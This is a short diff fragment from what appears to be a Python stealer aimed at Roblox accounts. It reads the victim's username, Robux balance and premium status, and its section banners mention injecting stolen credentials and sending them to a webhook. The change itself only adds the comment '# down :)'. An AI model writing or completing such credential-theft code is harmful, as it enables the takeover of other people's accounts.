@@ -138,7 +138,7 @@ username = info['UserName']
 robux = info['RobuxBalance']
 premium = info['IsPremium']
 #################### INJECT TO ROBLOX (creds to bingo methods) #################
-
+# down :)
 #################### SENDING TO WEBHOOK #################
 
 
